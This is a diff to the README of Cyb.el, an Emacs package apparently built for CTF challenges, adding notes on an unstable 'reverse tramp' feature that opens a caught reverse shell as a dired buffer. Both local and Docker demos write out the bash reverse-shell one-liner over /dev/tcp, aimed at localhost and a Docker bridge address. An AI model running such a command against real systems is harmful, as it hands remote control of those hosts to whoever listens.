@@ -1,11 +1,42 @@
 #+title: Cyb.el
 
-WIP: Provide tools for pentesting or CTF challenges.
+WIP: Provide tools for CTF challenges.
 
 * Features
 ** Reverse shell
 #+BEGIN_SRC emacs-lisp
 (cybel-revshell)
 #+END_SRC
-* Todo
 ** Reverse tramp
+still unstable
+Known issues:
+- vterm kills the connection
+- shell-command works whereas async-shell-command does not
+- eshell is unstable (executing does not work)
+*** Local demo
+In Emacs
+#+BEGIN_SRC emacs-lisp
+(find-file "/rev:127.0.0.1#1111:")
+#+END_SRC
+With another account run
+#+BEGIN_SRC bash
+bash -i >& /dev/tcp/127.0.0.1/1111 0>&1 ; echo $?
+#+END_SRC
+
+A dired buffer will open.
+*** Docker demo
+In Emacs
+#+BEGIN_SRC emacs-lisp
+(find-file "/rev:127.0.0.1#1111:")
+#+END_SRC
+in the hosts
+#+BEGIN_SRC bash
+docker run -it ubuntu bash
+# spawns a container and attach itself to it
+bash -i >& /dev/tcp/172.17.0.1/1111 0>&1 ; echo $?
+# depending on your network config
+# change the ip adreress as needed
+#+END_SRC
+
+A dired buffer will open in emacs, where the reverse shell is started.
+then execute ~M-x shell-command~, ~whoami~ to confirm.
